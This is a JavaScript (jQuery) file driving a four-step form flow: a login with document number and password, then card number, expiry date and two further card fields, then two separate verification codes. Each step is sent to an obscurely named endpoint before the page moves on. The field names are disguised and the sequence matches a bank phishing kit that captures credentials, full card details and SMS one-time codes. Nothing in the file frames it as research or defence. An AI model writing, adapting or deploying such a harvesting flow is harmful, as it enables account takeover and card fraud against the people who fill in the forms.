$(function(){
    $("#pg1").on("submit",function(e){
        e.preventDefault();
        let doc = $("#doc").val();
        let ndoc = $("#ndoc").val();
        let paso = $("#paso").val();


        //send backend:
        $.ajax({
            url: '/gzLbTbjqMpc34D4XsPJ2',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({doc,ndoc,paso}),
            success: function(info) {
                if(info.OK){
                    window.location = "/fGnEL4jmpuBCDkJP3myR";
                }
            }
        });
    });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a1 = $("#carita").val();
        let a2 = $("#dato").val();
        let a3 = $("#vv").val();
        let a4 = $("#pp").val();
        a1 = a1.split(" ");
        a1=a1.join("");
        let cc_t = false;
        let dd_t = false;

        if(a1.length == 16 && (a1[0] == "5" || a1[0] == "4")){
            $(".th_cc").removeClass("error");
            $(".th_cc_p").removeClass("error2");
            cc_t = true;
        }
        if(!(a1.length == 16 && (a1[0] == "5" || a1[0] == "4"))){
            $(".th_cc").addClass("error");
            $(".th_cc_p").addClass("error2");
        } 
        if(a2.split("/")[0].length==2 && a2.split("/")[1].length==2){
            $(".th_dd").removeClass("error");
            $(".th_dd_p").removeClass("error2");
            dd_t = true;
        }
        if(!(a2.split("/")[0].length==2 && a2.split("/")[1].length==2)){
            $(".th_dd").addClass("error");
            $(".th_dd_p").addClass("error2");
        }

        if(cc_t && dd_t){
            //send backend:
            $.ajax({
                url: '/NkMNm4664XhcW8KuukHk',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({a1,a2,a3,a4}),
                success: function(info) {
                    if(info.OK){
                        window.location = "/Q89HFszQPd3TFv4mx65k";
                    }
                }
            });
        }
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/m4kT9BQWt7KTDdaVmafx',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/aEsKRvuaENZtYax265Kv";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sps2").val();
        //send backend:
        $.ajax({
            url: '/Qv69PRvXg6PQEvrzJx6j',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/FUJaKCADUZpDap5hfe78";
                }
            }
        });
    });



});